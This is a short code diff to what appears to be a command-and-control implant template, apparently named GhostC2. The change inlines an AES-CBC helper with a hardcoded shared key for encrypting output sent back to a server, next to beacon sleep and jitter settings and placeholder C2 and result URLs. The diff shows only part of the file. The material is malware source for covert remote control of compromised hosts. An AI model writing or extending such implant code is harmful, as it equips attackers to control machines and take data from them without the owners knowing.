@@ -16,14 +16,23 @@ import requests
 import subprocess
 import base64
 import random
-import Crypto.Cipher.AES
-import Crypto.Util.Padding
+
+def aes_encrypt(plaintext):
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad
+    from Crypto.Random import get_random_bytes
+    import base64
+
+    key = b"ThisIs32ByteAESKey_For_GhostC2!!"  # Must match server
+    iv = get_random_bytes(16)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
+    return base64.b64encode(iv + ct_bytes).decode()
+
 
 SLEEP_TIME = 15
 JITTER_RANGE = 5
 
-sys.path.insert(0, "{abs_utils_path}")
-from crypto import aes_encrypt
 
 C2_URL = "{c2_url}"
 RESULT_URL = "{result_url}"
